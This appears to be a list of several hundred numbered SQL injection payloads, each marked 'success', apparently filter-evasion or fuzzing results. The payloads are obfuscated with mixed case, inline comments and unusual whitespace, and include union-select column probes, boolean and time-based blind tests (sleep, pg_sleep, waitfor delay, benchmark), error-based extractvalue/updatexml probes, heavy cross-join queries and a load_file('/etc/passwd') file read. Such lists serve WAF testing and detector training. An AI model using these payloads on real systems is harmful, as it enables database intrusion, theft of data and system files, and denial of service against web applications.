1 success "-8159 wHeRE '&8' LIKe '&8'/**/union\x0ball SEleCT (selECT 2793),2793,2793,2793,2793# "
3 success "1'   )    )    as stnn where 'v'!='v|' && 0x22b1   LIKE /**/ 7347-- "
4 success "(SELECT 0x1)'||  ( /**/select 'ywfo'/*8\\*/from dual where 'L'<>'L%' rlike sleep  (  (SEleCt\t5)  )  # `^"
6 success "-0x1be6'   )/*H*/   )/*U|Jy*/   union\x0ball SelEcT 5083,5083,0x13db,0x13db# "
7 success "1' where 8864   LIKE  \x0b0x22a0 "
8 success "1%' union/*GUw*/all SELeCT null,null,null#\t"
11 success '0x1"   )    )    AS xwrq/**/wHERE (selecT 4161)   LiKe   4161 '
15 success "1%' AND 2006  = /**/2006 "
16 success '-(SELECT 9031)%"  )  \norder by 1-- cI'
22 success "sELecT pg_sleep  (  0x5  )   aNd    (    (/**/  'vxxg'  =  'vxxg "
24 success '-2378"/**/where 2686  =  2686 or 0x1ad8  = \n6872-- y'
25 success "-(SELECT 4330)'/**/union all\x0cselect 3059,3059,3059,3059,3059,3059,3059,3059,3059--\n"
27 success 'iif  (  (SELECT/**/1878)   LIKE   2513,1,1/0  ) \n '
29 success 'End And    (    (   2160   LIKE   2160 '
30 success "-(SELECT 6220)'/*lv&b*/union all/*=r*/select/**/(SELECT 1462),1462#/**/"
34 success '-4543"\x0b )   OR 3038  /**/LIKE   (SELECT 3038) '
35 success '-9659   )    ) /*p\x0c0d=*/\x0b  )\x0c \x0cunion all SELEct 0x21d9,(SELECT 8665),8665,8665,8665,8665,8665-- '
36 success '1" where 641<>642 '
37 success "-9014%'  )  /**/union all selECt 4211,4211,4211,4211,4211,4211# "
38 success '1%"\xa0 )   && (sElEcT 8635)   LIke     ( /**/SEleCt count  ( \xa0*  )   FRoM generate_series  (  1,5000000   )   /*i]Ry*/)   -- '
39 success '(SelEct 0x1)  ) /*4n*/ union/**/all\nsELeCT null,null,null,null,null,null-- 0x53'
40 success '-(SELECT 7202)%"   )   /**/)  \x0b union/**/all select 2901# S)S'
41 success ' select */**/from\x0cusers where id  =  1 or ".  )  " or 836 IN (835,836,837) -- 1 '
42 success "1'||  (  select 'svnn' FRom dual WHEre (seleCt 0x2206)   LikE   8710 "
43 success '1"  )   && sleep  (  0x5  ) \xa0# RT'
44 success '1  )   As bpap wheRe 7758  =  7758 AND True OR 4240  =    (  SElEct 4240 froM pg_sleep  (  5   )    )   -- =J'
45 success '1   )    )    as wajy where\x0b8593   like  /*Y[*/8593 && 1 '
47 success '1,  (  SELecT   (  CASe WheN   (  5433   lIkE   5433  )   theN 0x1 ElSe cast  (  1 As int  )  /  (  SelEcT 0x0 from dual  )  /**/end  )   FroM dual  )   '
48 success 'seLEcT   (  CASe WHeN   (  9393   lIke/**/  5530  )   ThEn 9393 ELsE cast  (  1 AS int  )  /  (  seLeCT (sELEct 0x0) FroM dual  )   ENd  )   FrOM dual-- '
49 success 'SEleCT   (  cASE wHeN   (  8993  =  0x228e  )   THen 0x2321 eLse (select 8993)*  (  SeleCt 8993 fROm mysql.db  )   enD  )  # :\\'
50 success "-(SELECT 9484)' or   (  (SELECT 7129)  =  2349  )\x0c *0x92d\x0band 'fcsa' like/**/'fcsa "
53 success "-9653'  )   where 2705  =  2705 or 9323  =  9323/**/AND True# ^r"
55 success "-9541  )   as bnky wHERE 'm@' NOT LIKE 'm@Z' union all\tseLeCt 3934,3934,3934# "
58 success "1   )    )    aS xzcl WHere 'WxG' LIKE 'WxG' "
59 success '1  )   wHere 9039 in (9038,9039,9040)/**/or 1022   liKe     (  selecT count  (  *  )   frOM all_users t1,all_users t2,all_users t3,all_users\x0ct4,all_users/**/t5  )  -- '
60 success "1   )  /*:*&*/ )     )   And elt  (  'RM0W'<>'RM0W-' oR False,7259  )   And    (    (     (  5030  =  5030 and 'oY+\xa0N' NOT LIKE 'oY+ Nl' "
64 success '(SELECT 0x1)%" and/**/elt\x0b (  5345  = \x0b8751,8751  )   and "%"  =  " '
65 success "-8397'   )\x0c   )     )    OR  (SELECT 2171)  =  4788 "
66 success '-(SELECT 9737)" \n )    )     )   order\nby 0x1-- *G'
67 success "-1256' In boolean mode  )/**/  union all seLeCt 7889,7889,7889,7889,(SELeCt 7889),7889,7889,7889,7889-- #J"
69 success '0x1  )   aND elt/**/ (  7425  =  8842,0x228a  )   AND   (\x0b 0x23ea  =  9194 '
71 success ' seleCt * FRom users WherE id  =  0x1 OR 1#"? union sElECT null,version  (    )   -- 1 '
72 success 'SELEct\x0c'
73 success '1   )    )    AS juoe WHERe 1885 NOT LIKE 1886 or 2367  =    (  seleCt/**/count  (  *  )   FroM rdb$fields AS t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions As t4  )  -- ka'
74 success "-9574'  )\xa0  aS rxym WHERe 4719   LikE   4719 union all SELEct 4719,4719,4719,4719,4719,4719,4719-- `/"
77 success "0x1'||  (/**/ select 'aair' WHErE 0x2412   LIKE  \xa0(sELeCt 9234) union all SELeCt/**/null,null,null,null# "
80 success '1 order by/**/1-- '
82 success "1'+  (  select iutk\x0bwhere/**/6158   LIKE   6158 "
83 success '-4885 union all SeLect 4589,4589,4589,4589,0x11ed,4589,4589,4589,4589,4589#\n'
85 success ' SElECT * FRoM users WHeRe id  =  1 oR 1#"1 union SeLECt \'a\',version  (    )   --/**/1 '
86 success '-9891" union all sELecT 7489# '
87 success '0x1"   ) /*S3*//**/ ) \xa0\xa0 union/**/all seLECT\x0bnull,null,null,null,null,null,null,null,null-- :]Y'
88 success "1' WHEre 2762 NOT LIKE 2763/**/order by 1-- "
89 success "1  )   wHerE 9647 LIKE 9647 AND ']''<>']'y' oR '\t' LiKe/**/'\tC' "
91 success 'if  (  3593   LikE   3779  )   SElecT 3593 ELsE DRop function qtqy-- lE'
92 success "1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  sEleCt   (  cASE wHEn   (  2550 NOT LIKE 2551 AnD 4545!=4546 aND 4627<>0x1214  )   ThEn 1/*2T|K#*/else 0 End  /**/)    )   ,0x717a767a71   )   \n)   ,(sElecT 1)  )   {)jS"
93 success '(SELECT 0x1)"  /*-vo5W*/)    )\x0b\xa0   )   '
95 success "-4699  )   aS mymz wHErE 8061=8061 Or elt  (  '~' like '~',3623  )  -- "
96 success ' sEleCt * FROm users whERE id  =  1 OR 1#"{ union SelecT null,version  (    )   -- 1 '
97 success '-0x248c or elt  (  227 LIKE (SELECT 227) && 2210 NOT LIKE 2211,3623  )  -- izgi '
99 success "1' and elt  (  5964=5964 AND 'C'\xa0LIKE 'C' AND 1 OR 4957 NOT LIKE 4957 AND ' *[.' LIKE ' *[.',7259  )   and 'nsbj' like\n'nsbj "
100 success '1  )   OR 9643  =    (  SeLect count  ( /**/*  )   frOM domain.domains aS/*of*/t1,domain.columns As t2,domain.tables AS t3  )   '
102 success "1' where/*0j+_*/0x109d   LIKE   4253 "
103 success '0x1" where \'<\' LIKE \'<\' AND 1 '
106 success '-1447" union\nall SElECT 0xbc5,3013,3013,3013,3013,3013,3013-- z)v'
107 success '-2226%"   )   /**/)    union all/*2M`*/select 1018,1018,1018,1018-- '
108 success "-(SeLEcT 4828)'+/**/ (  select qxnw where 'Z'='Z' AND 'cAH\n'<>'cAH\nJ' oR False union all sELeCt 9488,9488-- "
110 success '1  )   WHErE 9010  =  9010 AnD 8514  =    (  SELEcT count  (  *\t )   FRoM domain.domains aS t1,domain.columns AS t2,domain.tables aS t3  )  -- '
111 success "1'   )    )    as xqvq where 1211 NOT LIKE 1212 OR 9543 NOT IN (9542,9543,9544) OR 'c>'!='c>' AND 'XDs1Y'<>'XDs1Y''  oR  4240   LiKe     (  sELecT 0x1090 frOm pg_sleep  (  5   )    )   --\t"
112 success '1" order by\x0c(SELECT 0x1)# '
113 success '-2071\xa0union/**/all SelEcT (SEleCT 4753),4753-- '
114 success "1' where 5230/**/ \nlike   0x146e\t"
115 success "1  )   waitfor delay '0:0:5' and   (  3223 NOT LIKE 3224 "
116 success "1%'  )   Or/*Q~R*/8514   LIkE   benchmark \n(  0x4c4b40,md5  (  0x544d5a4c   )    )   # "
118 success "SELeCT count/**//**/(  * /**/)   fROM sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables aS t3 ANd\x0c   (    (     (  'vcgc' LIkE 'vcgc "
119 success '-5560"/**/  )    )    oR 7292  =  6184# '
122 success "1'  )   WheRE 0x848 \t likE   2120 "
124 success '1" aNd elt  (  2666<>2667,0x1c5b\x0c )  \t'
126 success '-2168" /**/ )/**/   )  \t/**/union all sEleCT\xa04935,4935,4935,4935,4935,4935,4935,4935,4935-- '
130 success '1   )    )    as avdz WhERE\t1881  =  0x759 and 6510   Like     (  SelecT count  (  *  )   FRom sysusers/**/as sys1,sysusers AS sys2,sysusers as sys3,sysusers aS sys4,sysusers AS sys5,sysusers as sys6,sysusers As sys7  )  -- '
135 success 'seleCT count  (  *  )  /**/FrOM domain.domains as t1,domain.columns AS t2,domain.tables As t3# kuqm/**/ps'
136 success "-7088'||  (  select 'arol'/**/from dual\twhere 'F&I'='F&I' union all SElect 8891,0x22bb,(SelEcT/**/8891),0x22bb,0x22bb,8891,8891,8891# `w"
137 success ' having/**/1   LIKE \x0c 1 AND True-- '
139 success '1"  )   As rcnk wHeRe 1800  =  1800 OR 7924 LIKE 7925 '
141 success '0x1%"  ) \t ANd 8024   LIKE /**/ 3560-- RH'
143 success "-5528'  )   union/**/all select 5153,5153,5153,5153,5153,5153,5153,5153,5153# '"
145 success "SELecT count  (  *\xa0 )/**/  FROM/**/generate_series  (  1,5000000  )   ANd    (    (   '@Y'<>'@Y<' "
147 success '1"  ) /**/ As fgne WHeRe 7207  =  7207 '
148 success 'SeleCT * FRoM generate_series  (  9058,0x2362,CASE When   (  9058   like   0x49f  )   TheN 1 Else 0 End  )   limit 1-- UJ'
149 success "1'+  (  SeleCt mkbv WheRe 6983 iN (6982,6983,6984) AnD 9254  =    (  SELECT count  (  *  )   fRom rdb$fields aS t1,rdb$types AS\x0ct2,rdb$collations as t3,rdb$functions AS t4  )  -- "
150 success "seLEct count \x0b(  * /*Z+(SELECT 0)#*/)   FROm generate_series  (  0x1,0x4c4b40  )   And   (  'qpdu'   LIke   'qpdu 'Z]"
152 success '1"  )   where 9962  =  9962 OR \'|J\' NOT LIKE \'|J\' AND 4595  =  4595# '
154 success '1" wheRe 7879   LIKE   7879 and 1 '
155 success "(sELEcT 1) whErE ''g'<>''gV' aND 5496<>5497 ANd 2716  =    (  SelECT count  (  * /*4*/)   fRoM sysusers AS sys1,sysusers As sys2,sysusers as sys3,sysusers As sys4,sysusers as sys5,sysusers as sys6,sysusers aS sys7  )  --\x0c"
158 success "(sElECT 1)'  /**/)    ) \t  AS xkiq Where 9008   lIKe   9008 and sleep \t(  (SELeCT 5)\t )  -- "
162 success 'oR 1  \nlike   1/* '
163 success "-9370'  )   wHErE 7070   like   7070 AND True OR make_set  (  0x248a  =  9354,7185  )  -- P*"
164 success "1'||  (  select 'hwdj' where 1794 IN\n(1793,1794,1795)\n"
165 success "0x1'  )   where 3476  =  3476 AND 9540 LIKE 9540 AND 1148=1148 AND True OR False and elt  (  1210  =  0x4ba AND\x0b'\x0b' NOT LIKE '\x0by',sleep  (  5   )    )   -- "
166 success "1'||  (  select 'ymre' wHERE 8681   lIKE   8681/**/"
168 success '1" where \'7M\' LIKE \'7M\' AND True\x0bAND 9407 IN (9406,9407,9408) '
174 success " )\xa0 /**/OR   (  'x'/**/ = /**/'x "
177 success '1"   )    )    AS\x0cdshc WHeRE 9911  =  9911 AnD 1407 NOT LIKE 1408 or \'\t\' NOT LIKE \'\t\' Or\n1022  =    (  sELEcT count  (  *  )/**/  From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
178 success "-3867%'  )\x0b  or 0xc0c  =  5633/*44|xZ*/and   (  '%'  =  ' "
179 success "1'  )  /**/as rhvm where (SELECT 1420)   like   0x58c "
181 success '1  )\x0c  Or elt  (  124<>125,sleep  (  5  /*mQ*/)    )    ANd   (  8600  =  8600 AND True '
183 success 'sELect caSE wHeN 5559  =  3483 TheN 1 ElSe null EnD--\x0c'
184 success '-4152"  )   where/**/9781   liKE   9781 oR 0 union all SEleCT 9781,9781,9781,9781,9781-- n'
186 success 'SeleCt sleep  ( /**/0x5  )   aND    (    (     (  "lczw"   lIkE   "lczw '
188 success '(SELECT 0x1)/**/  )    ) /*&U_xM*/ /**/union\xa0all sElECT null,null,null,null,null,null,null,null-- '
190 success '(SELECT 0x1)   )    )  '
192 success "-4955%' union all SELeCt 5928,5928-- Y/"
194 success ' select * from users/**/where id   like   1 <@. union select 1,version  (    )   -- 0x1 '
196 success "1'/**/union all sELeCT null,null,null,null,null,null,null,null# 0x3"
197 success "1'  )   aS yyyb WHERE 1705  =  1705 aNd   (  0x2242   LIKE   0x1b4c  )  *6988-- "
199 success "SELect * From users WHeRE id  =  1 OR \\<   =  1 || 'Ib'<>'Ibb' OR 0 -- 1 U"
200 success "1'||  (  select 'etvo'/**/from dual where 1557  =  1557 AND 'T3}' NOT LIKE 'T3}=' "
202 success '-(SELECT 5591)%"   )    )   /**/order by 0x1-- '
208 success "0x1' IN boolean mode  )   aNd/**/sleep  (  5  )  # "
209 success '1" WHeRE 2642  =  2642 && 1 OR \'z\'=\'z9\' OR 8315  =    (  sELeCT count  (  *  )   froM sysibm.systables As t1,sysibm.systables aS t2,sysibm.systables As t3  )  -- '
211 success '\nENd aNd "%"  =  " '
212 success "0x1'+  (  select yjyp\twhere 'R'!='R[' OR False AND 'P~x'='P~x' "
215 success "0x1'   )    )    as tcby where 5213  =\xa0 5213 OR 7763 LIKE 7764 AND 1 "
217 success "SeLEcT sleep  (  5  )   AND    (    (     (  'iwwa' lIkE 'iwwa "
218 success "0x1'||  (  select 'pzoe'\xa0where '>' LIKE '>' aND elt  (  3114   LIke   0xc2a Or 0x0,sleep  (  0x5   )    )   #/*ok6h*/Q"
221 success '0x1"   )    )    as jgie WheRE 8017  =  8017 anD 8315=8315 &&   (  SELEcT * From   (  sEleCt  (  sleep  (  5   )    )     )  fzno  )  -- '
222 success "1' wHerE 2661   LIKE   2661 "
223 success "-4373'+  (  select 'rlht' wheRE 2285\n  lIke   2285/**/union all seleCT 0x8ed,2285,2285# "
226 success "1' iN boolean mode  )\n  ANd 0x165d  =  5552# "
227 success 'seLEct * FroM users whERE id  =  1 +   (  \\+  )   OR 1  =  1\t-- 1 '
228 success "1' WHere 0x1351  =  (SEleCT/**/4945) "
230 success ' (  sELect   (  cASE wHen   (  1570  =  6977/**/ )   THEN (seLEcT 1) else 1570*  ( \x0cSeLeCT 1570 FrOM mysql.db  )   ENd   )    )  '
232 success "1' /*Q*/)   union/**/all/**/SELEcT\tnull,null,null,null,null,null-- t"
235 success "-5327'   )    )     )   OR 1606  =  (SELECT 0x17d3) "
237 success '0x1 union all/**/SelECT\nnull,null,null,null,null,null,null,null# FG{>'
238 success "1'+  (  select 'tjvt' where 494 LIKE 494 AND '=O'!='=OX' "
239 success '(SELECT 1)"  \xa0)    )    as xbhp where 7527   LIKE   0x1d67 '
241 success "1'||  (  select 'vdeo' where 8464 NOT LIKE 8465 "
242 success 'SElEcT pg_sleep  (  0x5  )   ANd "%"  =  " '
243 success "0x1' rlike/*m*/sleep  (  5/**/ ) \x0c# "
245 success "(SEleCt 0x1)'  )   && 0x20d7  =    (  SELECT count  (  *  )   FrOm generate_series/*`NP*/ (  1,5000000   )    )    "
246 success "select sleep  (  5  )   and/**/ \n/**/(    (   'w}.'<>'w}.v' "
248 success '-2276"   )    )    As qwow WHerE 2321  =  2321 OR \'&T\' lIke \'&Ts\' Or 3534  =  2971-- '
249 success '1 WHeRe 2649   LIKe   2649 or   (  SelECt * FROM   (  Select  (  sleep  (/**/ 5   )    )     ) \x0cydpu  )  -- '
250 success "(SElecT 1)'  )   where '2k' LIKE '2k' OR 'Yv'!='Yv' union all SelEct null,null,null,null,null# t"
254 success "1'\nwhEre 7014   LikE   7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   -- "
255 success ' SELEcT\xa0* frOM/**/users wherE id   LIKE   \'0x1\' union sELEcT $["],@@VERSION -- 1\' '
258 success '0x1"/**/ )/**/  AS jqli WhErE (SeLECt 7050) in (0x1b89,7050,0x1b8b)\xa0'
259 success 'selEct   (  CaSe WhEn   (  5704   lIke   4125  )   theN 5704 ElsE cast  (  (seLecT 1) aS int  )  /  (  SelecT 0 frOm dual  )   EnD  )   FrOm dual-- )_'
260 success '1  )   As cejp WHerE 4736  =  4736 oR 0 or False oR 5286  =    (  SeleCT count  (  *  )   FROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
262 success "-5356'  )   or 7404!=7405# "
269 success ' select * from users where id  =  1 or "0x1{" or 1  =  1 AND 4964 NOT LIKE 4965 AND True -- 1 '
272 success "(SELECT 1)'||  (  select 'mlwj' from dual where 4247  =  4247 OR 2773 NOT LIKE 2773 AND 4398!=4399 OR 'u'<>'u' and 1702  =  8469  )  ||' "
275 success 'declare @s varchar  (  22  )   sEleCT @s   =  '
276 success '1" whEre \'O@S,\'\x0bNOT LIKE \'O@S,L\' OR 0 OR 8156\t  LIKE     (  SEleCT count  (  *  )   FROM generate_series  (  0x1,5000000   )    )   -- '
279 success "1   )    )    aS kycl wheRe 'I' lIke 'I' Or 8384   LIKE   lIkE  (  'abcdefg',upper/**/ (  hex  (  randomblob  (  500000000/2/**/  )    )      )    )   -- "
281 success 'As\n'
282 success "1' && elt/**/ (  4249  =  4249,7259  )   "
283 success "1 whErE 7362   LIKE   0x1cc2 AND 8148   LIKE   LiKE  (  'abcdefg',upper  (  hex  (  randomblob\x0c (  500000000/2   )    )      )    )   -- "
284 success "-1084 wHErE 1181  =  1181 And 1 oR 'lr\r9i'<>'lr\r9i' or make_set  (  9354  =  9354,7185  )  -- "
287 success '1  )   aNd 0x2142  =    (  SeleCt count  (  *  )   fRoM domain.domains aS t1,domain.columns As t2,domain.tables AS t3  )   &&   (  4666 /*^C(*/=\xa0 4666 '
288 success '(SELECT 1)%" and\x0c7533  =  7533 OR 9265 NOT LIKE 9265/**/and/**/"%" \xa0=  " '
296 success "1'||  (  select 'zqdn'/**/where 'S8' LIKE 'S8' ||/**/8854 NOT IN (8853,8854,8855)/**/union\x0call select null,null,null,null--/**/Xg"
297 success '-2453"  )\n /**/union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520-- +'
300 success "0x1'  ) /**/ oR\nsleep  (  0x5 \t)  "
301 success "1'/**/ )   union all\nselect/*(SELECT 0){*/null# "
302 success "(SELECT 1)'||  (  select 'xugb' from/**/dual where ')I' LIKE/*p}Z*/')I' "
303 success ' SeLEct * FrOm users wheRE id  =  0x1 OR 1#"$ union SElEct \'a\',version  (    )   -- 1 '
304 success "1'   )    )    aS qcgf WHerE/*L*/9656  =  0x25b8 && 7283<>0x1c74 AND True or 0x14ec  =    (  sEleCT count  ( /**/*  )   from sysusers aS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers as sys5,sysusers As sys6,sysusers AS sys7  )  -- R}b"
305 success "select\x0c* from users where id  =  '1' or $<\\ or 234 LIKE 234 -- 1' "
306 success '1"  )   wHERE 9248   LIKE   9248\n'
309 success '1   (  SElect   (  CasE wHEn   (  10000<>10001 OR 3583 NOT LIKE 3583 OR 8385!=8385 oR/**/2492 LiKe 2493  )   tHEn regexp_substring  (  repeat  (  right  (  char  (  0x154b \x0c)  ,0  )  ,0x1dcd6500  )  ,null  )   eLse char  (  108  )  ||char  (  76  )   OR char  (  112  )  ||char  (  116  )   END  )   FROm information_schema.system_users  )  -- fzhj <}_'
310 success ' end &&    (   \x0c(     (  "memh"\x0clike "memh '
311 success ' select * from users where id  =  0x1 or ";#" or \'Jl\' NOT LIKE \'JlH\' --/**/1 '
312 success '0x1  /*\x0c6P&|*/)    )    && updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  sElect   (  elt  (  9264<>9265 AND True,1 /**//**/)    )\x0b    )  ,0x717a767a71  )  ,0x489  )   AnD    (    (   0x1594   lIkE   (SELecT 5524) '
313 success "1'+  (  select taga where\n8036   LIKE   0x1f64 "
314 success '-8639\x0c )   oR 8138  =  6252 '
316 success ' (  seleCT   (  CAse WHen   (  6035   LIKe   9882  )   tHeN 6035 Else 6035*  (  SElect 6035 fROM mysql.db  )   END   )    )  '
317 success '1"   )    )    aS iubt whERE 8179   lIke   0x1ff3 oR \'Id\' lIKe \'IdK\' or 9643  =    (  SElECt count  (  *  ) \t frOm domain.domains as t1,domain.columns aS t2,domain.tables As t3  )  -- '
318 success "1'+  (  select gqez where 0xe78   LIKE   0xe78 "
319 success '-7416" wHeRE \'Cbd-\' NOT LIKE \'Cbd--\' OR \'F\' LIke \'F5\' order by 1-- R%'
321 success "1  )  /**/where\x0c'4' NOT LIKE '4g' "
324 success '-5520%" union all/**/SeLECt 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235-- '
325 success "1',  (  SEleCt   (  cAsE WHeN   (  7616   liKE   0x1dc0  )   ThEN 1 eLse 1/  (  SELECT 0  )   EnD   )    )    "
327 success "1'  )   where '_=' NOT LIKE '_=A' AND '=e'!=' LIKe e'' anD 3210  =  1477-- "
328 success '-3130 /**/) \x0c union all\tsELECT 1741,1741,1741,1741,0x6cd,1741,1741,1741# '
330 success '1%"/**/ )   && (sElecT 9198)\x0b  like   0x23ee-- '
332 success "-9393' wHErE 3119  =  3119 Or 5701!=5702-- "
333 success "1'   )    )    As bsvk wHere (SELECT 5985)  = /*VxD=n*/5985 anD True AND 0x1 anD extractvalue  (  7982,concat  ( \x0c0x5c,0x7171706a71,  (  SelEct   (  elt/**/ (  7081=7081 AND 1 OR 3210!=3210,1   )    )     )  ,0x717a767a71 \x0b )    )   -- qw;"
334 success "-0xebf'  )   aS rqet where/**/'g' LIKE 'g' OR elt \n(  0x408  =  1032 OR '[,'<>'[,',3623  )  -- "
335 success " union/**/select 1,load_file\x0b (  '/etc/passwd'  )  ,1,1,1; "
337 success "-2855'/**/union all SeLEcT 2495,2495,2495,2495,2495,2495,2495,2495,2495--\t"
338 success '-8629 wheRe 8049  /*!OE3*/lIke /**/ 8049 union all sElect\x0b8049,8049,8049,8049,8049,8049,8049# '
339 success "1  )   as mixt where 'g4' NOT LIKE 'g4b' or sleep  (  0x5  )  -- "
341 success "1'   )    )    As prxm wHEre 'KO3' NOT LIKE 'KO3~' AND 3580   LIKE     (  SelECt count  (  *  )   FROM domain.domains as t1,domain.columns AS t2,domain.tables As t3  )  -- /C"
342 success "1'  )   wHERe\n6731   like   6731 AND 7202=7202 Or elt  (  5873  =  0x16f1 OR False,sleep  (  5   )    )   # H"
344 success '1   )    )    AS fpej wHErE 6790  =  6790 aND   (  3020  =  3020  )  *6703-- '
352 success "%27/**/or '_A7'='_A7' OR 7630=7631 "
355 success '0x1%"/**/  )\n   )     )   OR 0x1cf9   lIKe  \t  (  seLECt count  (  *  )   FROM sysibm.systables As t1,sysibm.systables AS t2,sysibm.systables as t3  )  -- '
358 success '(SelECt 1)"  )   As zuzm wHerE 1211  =  1211 And True aNd elt  (  5458  =  2966,2966  )  -- '
359 success "1'+  (  select oogh where 2194 NOT LIKE 2195 AND 1 AND 'tj\t' NOT LIKE 'tj\t8' or elt  (  '%`@'='%`@',sleep  (  5   )    )   # O"
360 success "1' In boolean mode /**/)   && 9198  =  9198-- "
365 success "-5386'  )\xa0  union\x0ball SeleCt 8026,8026,8026,8026,8026,8026# "
366 success '-4165" wHERE 1772  =  1772/**/Or 5716 NOT LIKE 5716 union\xa0all SeleCt 1772,1772,1772,1772,1772,1772,1772,1772-- '
367 success " (  sELEct   (  CAse whEN   (  1421  =  1421 AND 'Mz'<>'MzL'  )   tHeN 1 ELSE 1421*  (  SelecT 0x58d fROM master..sysdatabases \n)   End   )    )\x0c "
370 success "1'+  (  select gthp where 7311  =  7311 AND/**/1 AND 8093 IN\xa0(8092,8093,8094) or sleep  (  5  )  # C_"
371 success '1   )    )  /*BQ?*/  )   union/**/all seleCt null,null,null,null,null,null,null,null,null,null--/*)mC~*/'
373 success "1/*5]CS*/ )   OR elt  (  0x16f1  =  0x16f1,sleep  (  0x5   )    )   # 9yD'"
375 success "0x1%'  )  /**/Or 0x93f   LIkE     (  SELeCt count  (  *  )   FRoM rdb$fields AS t1,rdb$types as t2,rdb$collations AS t3,rdb$functions\naS t4  )  -- ds"
378 success 'SeLeCt   (  cASE wHeN   (  7217  =  7631  )   thEn 7217 elSE 7217*  (  SeLeCT 7217 FrOm information_schema.character_sets  )   enD \x0b)  # '
379 success "select * from users where id  =  '1' *$ 1 or 0xaa7 LIKE 2727 -- (SELECT 1)' n"
384 success '1  )   AS\x0blisg WHERe 5490  =  5490\xa0'
385 success '-(SELECT 6662)"   )/**/  \n) /**/  union all seLECt/**/6755-- '
386 success '1   )    )    As rvex Where 961<>0x3c2 And 9560<>9561# '
387 success '1" where (SELECT 3943) NOT LIKE 3944 order by 1-- '
389 success 'waitfor delay\t\'0:0:5\' aNd   (  "dmcu"  = \n"dmcu '
390 success "1%'\x0bunion\x0call/**/SELeCt null,null,null,null,null,null,null,null,null,null# "
391 success "1'||  (  select 'lljg' fROM dual WHerE (SEleCT\xa00x126b) not like 4716\x0c"
392 success '1  )   As wype WHEre 4019 LIKe 4019 OR 1336<>1336 oR 8315  =    ( \nseleCT count  (  *  )   fRoM sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables aS t3  )  -- '
394 success "1'+  (  select 'vabj' Where 1023<>1024 union all selEct null,null,null,null,null# "
397 success '(selEcT 1),  (  seLEcT   (  caSe whEN   (  1474 In (1473,1474,1475) oR 5710 NOT iN (5709,5710,0x164f)  )   ThEN   (  SeLeCT count  (  *  )   fROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   eLsE 0x1/  (  SElecT 0 FrOM dual  )   enD  )   FROm dual  )   '
398 success '-9860  )   wHERe 8743   like   (Select 8743)\x0bunion all sEleCT 0x2227,8743,8743,8743,8743,8743,0x2227-- '
402 success '1  )   wherE 8671  =  8671 ANd make_set  (/*Kz-k9*/ 4931  =  1642,0x66a  )  -- '
404 success '1  )   wHERE 7881  =  7881 ANd True And True aND 9660  =    (  seleCt count  (/**/ *  )   FROm\nall_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
409 success 'iif  ( /**/1157   LIKE   4542,(SELECT 1),1/0  )   '
412 success "select pg_sleep/**/ (  0x5  )   AND 'zfyy'  =  'zfyy "
413 success "0x1%'   )    )     )   order by 1-- P}k\r"
415 success 'sElECT   (  cAse WHen   (  4061  =  1396 /**/)   thEN 4061 eLSe 1/  (  SeleCt 0\x0b )   EnD  )  -- '
416 success "-9509'  )   where 9303  =  9303 AND 8413=8413 OR False order by 1# "
417 success '1  )   aS qodq WhERE 4945  =  (sELect 4945) Or 9643   like     (  sELEcT count  (  *\t )   fROm domain.domains As t1,domain.columns As t2,domain.tables aS t3  )  -- er'
418 success "(SELECT 0x1)%'  )   AnD 2716   LIKE \n\x0b  (  sELECt count  (  *  )   frOm sysusers aS sys1,sysusers AS sys2,sysusers As sys3,sysusers aS/**/sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS\tsys7  )  --\x0c8&"
421 success '1"  )   WHeRE 6255  =\n 6255 OR False OR 4423 NOT LIKE 4423 aNd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  SEleCt   (  elt  (  0x1f2e   LIKE   7982,1   )    )     )  ,0x717a767a71   )    )   -- O-'
423 success 'iif  (  8354   lIke   3515,1,1/0x0  )   '
433 success '-2448%"  )   OR 3038\n =  3038 '
434 success 'select case\x0cwhen 9390   LIKE   (SELECT 5752) then 1 else null end-- '
435 success '1" && elt  (  4594   LIKE   1040,(SELECT 1040)  )   '
438 success "1'  )   as chla where/**/'H$'<>'H$0x9' OR 6418 LIKE 6419 "
442 success 'SElECT   (  cASe wHEN   (  9986 \xa0=  0x2096  )   Then 9986 eLsE 9986*  (  SElEcT 9986 FroM information_schema.character_sets  )   EnD  )  # '
443 success '1   )    )    OR 8315  =    (  seleCt count  (  *  )   from sysibm.systables As t1,sysibm.systables As t2,sysibm.systables aS t3  )   AnD    (    (   9914  =  9914 OR 5027 LIKE 5028 '
444 success "1'  )   anD 0x1d6d\x0c  LIKE  /**/7533 "
446 success "-1621' IN/**/boolean mode  )  \x0border by/**/0x1--/**/"
447 success '1"\n/**/)   AS pobe WHerE 527 IN (526,527,528) '
448 success "1 WHeRe 2292  =  2292 AND 'g{p'!='g{p,' union all/*.Z*/sElEct null,null,null,null# "
451 success "-7868' IN boolean mode  )   union all/*RWL*/SELEct\x0b5117,5117,5117,5117,5117,5117,5117,0x13fd,5117# m+["
452 success ' sELEcT sleep\xa0 (  (sELECt 0x5)  )   aNd "%"  =  " '
453 success "-4205' union all seLECT 8986,8986,8986,8986,8986,8986,8986,8986,8986,8986# Hw`"
455 success 'seLEcT   (  CaSE wHen   (  7254  =  5901  )   theN 1 ElSE 7254*  (  sEleCT 7254 frOm master..sysdatabases  )   End  )  -- '
457 success '1"/**/ )   as ebvt where 5305  =  5305 AND 9672 IN (9671,9672,9673) '
458 success "0x1%'  )\xa0  union/*?[*/all selEct null# "
459 success '-0x268f" \x0b)  /**/union all select/**/9082#\t|g'
460 success "-6368'/**/union all SelECT 6529,6529,6529--\t[}"
461 success '(SELECT 0x1)   )    ) /**/  AND 0x2426   LIKE     (  SELECt count  (  *  )/**/  fRom rdb$fields AS t1,rdb$types As t2,rdb$collations aS t3,rdb$functions as/**/t4  ) /**/-- n_'
